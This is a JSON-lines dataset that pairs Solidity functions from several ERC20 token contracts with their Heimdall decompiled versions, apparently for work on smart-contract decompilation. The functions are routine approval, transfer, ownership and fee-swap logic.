{"contract_address": "0x4B28fbCeB6a565dEce49390a4E7B8168F29c03BA", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xEBe0De4bfB351537dd8Abdb2e53a880Cc13ce676", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_c[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x31F2C94D3EF63551FF418747EbBe67E5A083aDC0", "original_solidity_code": "function manualSwap() external {\\n        require(_msgSender() == _taxWallet);\\n        uint256 tokenBalance = balanceOf(address(this));\\n\\n        if(tokenBalance > 0){\\n          swapTokensForEth(tokenBalance);\\n        }\\n\\n        uint256 ethBalance = address(this).balance;\\n\\n        if(ethBalance > 0){\\n          sendETHToFee(ethBalance);\\n        }\\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a] > 0);\n        store_c = (0x01 * 0x01000000000000000000000000000000000000000000) | (uint248(store_c));\n        require(!storage_map_b[var_a] - 0);\n        require(!bytes1(store_c / 0x010000000000000000000000000000000000000000));\n        require(!0x02 > 0xffffffffffffffff);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x41;\n        var_d = 0x02;\n        uint256 var_e = var_e + 0x60;\n        require(!0x02);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_f = address(this);\n        var_g = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_l / 0x01).WETH(var_h); // staticcall\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!(((var_e + ret0.length) - var_e) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_i == (address(var_i)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_j = address(var_i);\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_l / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_l / 0x01);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_l / 0x01), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        uint256 var_n = ((0x04 + var_e) + 0xa0) - (0x04 + var_e);\n        uint256 var_p = var_e.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_l / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_l / 0x01).Unresolved_791ac947(var_l); // call\n        store_c = (0 * 0x01000000000000000000000000000000000000000000) | (uint248(store_c));\n        require(!address(this).balance > 0);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x1820C475379D1D3d4A20A404c26720Abe81D3620", "original_solidity_code": "function enableTrading() external onlyOwner {\r\n        require(!_tradingOpen, \"trading open\");\r\n        _openTrading();\r\n    }", "heimdall_decompiled_code": "function enableTrading() public view {\n        require(address(msg.sender) == (address(owner / 0x01)), \"OnlyOwner can call this\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x17;\n        var_e = 0x4f6e6c794f776e65722063616e2063616c6c2074686973000000000000000000;\n        require(!(bytes1(store_a / 0x01)), \"trading open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x0c;\n        var_e = 0x74726164696e67206f70656e0000000000000000000000000000000000000000;\n        if (0x09) {\n            if (!0x174876e800 | (0x01 == 0x01)) {\n                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_g = 0x11;\n                if (0x0a) {\n                    if (0x0a == 0x01) {\n                        if (0x0a == 0x02) {\n                            if (!0x09 > 0xff) {\n                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_g = 0x11;\n                                if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_g = 0x11;\n                                    if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                        if (!0x09 > 0x01) {\n                                            if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                                if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                    var_g = 0x11;\n                                                    if (!0x01) {\n                                                    }\n                                                    if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                        var_g = 0x11;\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x20ad88B64104B4E9B3915aAB9c3bfb4E4121622f", "original_solidity_code": "function updateandeditlimits() external onlyOwner returns (bool){\r\n        limitsInEffect = false;\r\n        transferDelayEnabled = false;\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function updateandeditlimits() public returns (bool) {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        tradingActive = uint248(tradingActive);\n        transferDelayEnabled = uint248(transferDelayEnabled);\n        var_a = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x4eeA955F63D7e24Ea7272651a29c7C70F7c2A9Ae", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public payable {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n    }"}
{"contract_address": "0x10A7A2212f6b6ffE22d339D8Aa6e89a17ad8b1ad", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_w) {\n            if (store_w - ((store_w / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_w / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_w / 0x02;\n                if (store_w) {\n                    if (store_w - ((store_w / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_w / 0x02) {\n                            if (0x1f < (store_w / 0x02)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_w / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xEaE65155951A1B2D3Ca8C6fc19194583233B57f4", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(store_k)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_d[var_a]);\n        store_c = 0x01000000000000000000000000000000000000000000 | (uint248(store_c));\n        require(!storage_map_d[var_a]);\n        require(!bytes1(store_c / 0x010000000000000000000000000000000000000000));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_g).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_g), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_g);\n        address var_b = keccak256(var_a);\n        storage_map_d[var_a] = storage_map_d[var_a];\n        address var_k = storage_map_d[var_a];\n        emit Approval(address(this), address(store_g), storage_map_d[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_d[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_g).code.length);\n        (bool success, bytes memory ret0) = address(store_g).Unresolved_791ac947(var_l); // call\n        store_c = uint248(store_c);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(store_k).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xAB17E21aaAaF60C9022E34e3AcdBC73EEeb0f880", "original_solidity_code": "function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        require(0 - arg1, \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(swappingStart)), \"ERC20: transfer amount exceeds balance\");\n        require(address(owner) == (address(msg.sender)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(owner)) == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        require(!(address(arg0)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!0xdead == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        require(!(!0xdead == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(this);\n        uint256 var_b = 0;\n        require(storage_map_e[var_a] < swapTokensAtAmount, \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_e[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_e[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_e[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_e[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_e[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!bytes1(owner / 0x010000000000000000000000000000000000000000)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!bytes1(owner / 0x010000000000000000000000000000000000000000)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!bytes1(owner / 0x010000000000000000000000000000000000000000)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!bytes1(owner / 0x010000000000000000000000000000000000000000)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!bytes1(owner / 0x010000000000000000000000000000000000000000)), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0x1f;\n        require(bytes1(storage_map_e[var_a]), \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(storage_map_e[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!0, \"ERC20: transfer amount exceeds balance\");\n        var_a = address(arg0);\n        var_b = 0x21;\n        require(!(bytes1(storage_map_e[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!(sellTotalFees > 0), \"ERC20: transfer amount exceeds balance\");\n        require((sellTotalFees == ((sellTotalFees * arg1) / arg1)) | !arg1, \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(0x64, \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_a = address(msg.sender);\n        var_b = 0x21;\n        require(!(bytes1(storage_map_e[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!(lastLpBurnTimef > 0), \"ERC20: transfer amount exceeds balance\");\n        require(!0, \"ERC20: transfer amount exceeds balance\");\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(this), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0;\n        require(!(storage_map_e[var_a] < 0), \"ERC20: transfer amount exceeds balance\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x26;\n        var_g = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_e[var_a] = storage_map_e[var_a] - 0;\n        var_a = address(this);\n        require(!(storage_map_e[var_a] > (0 + storage_map_e[var_a])), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        storage_map_e[var_a] = var_b + storage_map_e[var_a];\n        uint256 var_d = 0;\n        emit Transfer(address(msg.sender), address(this), 0);\n        require(!((arg1 - 0) > arg1), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(!(!bytes1(owner / 0x010000000000000000000000000000000000000000)), \"ERC20: transfer from the zero address\");\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = address(arg0);\n        var_b = 0x21;\n        require(!(bytes1(storage_map_e[var_a])), \"ERC20: transfer from the zero address\");\n        require(!(sellTotalFees > 0), \"ERC20: transfer from the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x21;\n        require(!(bytes1(storage_map_e[var_a])), \"ERC20: transfer from the zero address\");\n        require(!(lastLpBurnTimef > 0), \"ERC20: transfer from the zero address\");\n        require(!0, \"ERC20: transfer from the zero address\");\n        require(!((arg1 - 0) > arg1), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        lastLpBurnTime = block.timestamp;\n        var_d = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        var_e = 0xf82cf8e4225ebbea534c3ac06db0c1254160a111;\n        (bool success, bytes memory ret0) = address(this).Unresolved_70a08231(var_e); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!(((var_i + ret0.length) - var_i) < 0x20), \"ERC20: transfer from the zero address\");\n        require((percentForLPBurn == ((percentForLPBurn * var_i.length) / var_i.length)) | !var_i.length, \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(0x03e8, \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!((percentForLPBurn * var_i.length) / 0x03e8), \"ERC20: transfer from the zero address\");\n        require(0xf82cf8e4225ebbea534c3ac06db0c1254160a111, \"ERC20: transfer from the zero address\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_k = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(0xdead, \"ERC20: transfer to the zero address\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x23;\n        var_h = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_k = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_a = 0xf82cf8e4225ebbea534c3ac06db0c1254160a111;\n        var_b = 0;\n        require(!(storage_map_e[var_a] < ((percentForLPBurn * var_i.length) / 0x03e8)), \"ERC20: transfer amount exceeds balance\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x26;\n        var_h = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_k = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = 0xf82cf8e4225ebbea534c3ac06db0c1254160a111;\n        var_b = 0;\n        storage_map_e[var_a] = storage_map_e[var_a] - ((percentForLPBurn * var_i.length) / 0x03e8);\n        var_a = 0xdead;\n        require(!storage_map_e[var_a] > (((percentForLPBurn * var_i.length) / 0x03e8) + storage_map_e[var_a]));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        storage_map_e[var_a] = ((percentForLPBurn * var_i.length) / 0x03e8) + storage_map_e[var_a];\n        uint256 var_j = (percentForLPBurn * var_i.length) / 0x03e8;\n        emit Transfer(0xf82cf8e4225ebbea534c3ac06db0c1254160a111, 0xdead, (percentForLPBurn * var_i.length) / 0x03e8);\n        var_j = 0xfff6cae900000000000000000000000000000000000000000000000000000000;\n        require(address(0xf82cf8e4225ebbea534c3ac06db0c1254160a111).code.length);\n        (bool success, bytes memory ret0) = address(0xf82cf8e4225ebbea534c3ac06db0c1254160a111).sync(var_f); // call\n        if (!lpBurnEnabled) {\n            if (!lpBurnEnabled) {\n                if (!lpBurnEnabled) {\n                }\n            }\n        }\n        var_a = address(arg0);\n        var_b = 0x21;\n        if (!storage_map_e[var_a]) {\n        }\n        if (swappingStart / 0x0100) {\n            var_a = address(msg.sender);\n            var_b = 0x1f;\n            require(bytes1(swappingStart / 0x0100), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            require(bytes1(storage_map_e[var_a]), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            require(!(bytes1(transferDelayEnabled)), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            require(address(owner) == (address(arg0)), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            require(!(!(address(arg0)) == 0x7a250d5630b4cf539739df2c5dacb4c659f2488d), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            require(!(!(address(arg0)) == 0x7a250d5630b4cf539739df2c5dacb4c659f2488d), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(msg.sender);\n            var_b = 0x21;\n            require(!(bytes1(storage_map_e[var_a])), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(arg0);\n            var_b = 0x20;\n            require(!(!bytes1(storage_map_e[var_a])), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(arg0);\n            var_b = 0x21;\n            require(!(bytes1(storage_map_e[var_a])), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(msg.sender);\n            var_b = 0x20;\n            require(!(!bytes1(storage_map_e[var_a])), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(arg0);\n            var_b = 0x20;\n            require(bytes1(storage_map_e[var_a]), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n        }\n        require(!(arg1 > maxTransactionAmount), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x36;\n        var_g = 0x53656c6c207472616e7366657220616d6f756e74206578636565647320746865;\n        var_h = 0x206d61785472616e73616374696f6e416d6f756e742e00000000000000000000;\n        if (!storage_map_e[var_a]) {\n        }\n        require(!(arg1 > maxTransactionAmount), \"Buy transfer amount exceeds the maxTransactionAmount.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x35;\n        var_g = 0x427579207472616e7366657220616d6f756e7420657863656564732074686520;\n        var_h = 0x6d61785472616e73616374696f6e416d6f756e742e0000000000000000000000;\n        if (!storage_map_e[var_a]) {\n        }\n        var_a = tx.origin;\n        var_b = 0x12;\n        require(block.number > storage_map_e[var_a], \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x49;\n        var_g = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_h = 0x65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b;\n        var_k = 0x20616c6c6f7765642e0000000000000000000000000000000000000000000000;\n        if (address(owner) == (address(arg0))) {\n            if (address(owner) == (address(arg0))) {\n            }\n        }\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x16;\n        var_g = 0x54726164696e67206973206e6f74206163746976652e00000000000000000000;\n        if (!address(arg0)) {\n            if (!address(arg0)) {\n            }\n        }\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xFF5C43C4fADdF9A03BEdE1D0b276E7eC996504a1", "original_solidity_code": "function manualswap() external {\r\n        require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress);\r\n        uint256 contractBalance = balanceOf(address(this));\r\n        swapTokensForEth(contractBalance);\r\n    }", "heimdall_decompiled_code": "function manualswap() public view {\n        require(address(msg.sender) == (address(store_p)));\n        require(address(msg.sender) == (address(store_q)));\n        address var_a = address(this);\n        var_b = 0x02;\n        require(!(storage_map_g[var_a] > store_m), \"Amount must be less than total reflections\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x2a;\n        var_f = 0x416d6f756e74206d757374206265206c657373207468616e20746f74616c2072;\n        var_g = 0x65666c656374696f6e7300000000000000000000000000000000000000000000;\n        uint256 var_h = 0x40 + var_h;\n        var_c = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x0de0b6b3a7640000, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        uint256 var_g = var_h.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        if (0x0de0b6b3a7640000) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_n = 0x12;\n            if (!store_m < (store_m / 0x0de0b6b3a7640000)) {\n            }\n        }\n    }"}
